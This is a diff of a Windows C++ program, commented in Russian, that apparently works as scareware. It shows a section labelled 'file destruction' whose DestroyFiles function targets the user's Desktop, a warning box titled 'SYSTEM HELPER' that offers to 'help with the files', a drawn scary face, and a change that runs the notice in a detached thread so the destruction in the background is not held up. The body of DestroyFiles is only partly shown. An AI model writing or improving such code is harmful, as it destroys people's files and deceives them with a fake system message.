@@ -22,7 +22,6 @@ std::wstring GetSpookyText() {
 // ЧАСТЬ 2: РАЗРУШЕНИЕ ФАЙЛОВ
 // ==========================================
 void DestroyFiles() {
-    // Просто создаем мусорные файлы, чтобы не ждать долго
     wchar_t userProfile[MAX_PATH];
     GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
     std::wstring desktop = std::wstring(userProfile) + L"\\Desktop\\";
@@ -40,10 +39,11 @@ void DestroyFiles() {
 }
 
 // ==========================================
-// ЧАСТЬ 3: УВЕДОМЛЕНИЕ (С ЖУТКИМ ТЕКСТОМ)
+// ЧАСТЬ 3: УВЕДОМЛЕНИЕ (В ОТДЕЛЬНОМ ПОТОКЕ!)
 // ==========================================
-void ShowNotification() {
+void ShowNotificationThread() {
     std::wstring text = L"Hello, I am " + GetSpookyText() + L". I want to help you with the files!";
+    // Запускаем MessageBox в отдельном потоке, чтобы он не блокировал основной код
     MessageBoxW(NULL, text.c_str(), L"SYSTEM HELPER", MB_OK | MB_ICONWARNING);
 }
 
@@ -76,6 +76,7 @@ void DrawScaryFace() {
     // Кровавая улыбка (красная линия)
     HPEN redPen = CreatePen(PS_SOLID, 10, RGB(255, 0, 0));
     SelectObject(hdc, redPen);
+    // Используем Arc (дуга) для улыбки
     Arc(hdc, w/2 - 150, h/2 + 50, w/2 + 150, h/2 + 250, w/2 - 150, h/2 + 150, w/2 + 150, h/2 + 150);
     DeleteObject(redPen);
 
@@ -94,8 +95,9 @@ void DrawScaryFace() {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     srand(time(NULL));
 
-    // 1. Показываем уведомление
-    ShowNotification();
+    // 1. Запускаем уведомление в фоне (чтобы оно не блокировало)
+    std::thread notifyThread(ShowNotificationThread);
+    notifyThread.detach();
 
     // 2. В фоне разрушаем файлы
     std::thread destroyThread(DestroyFiles);
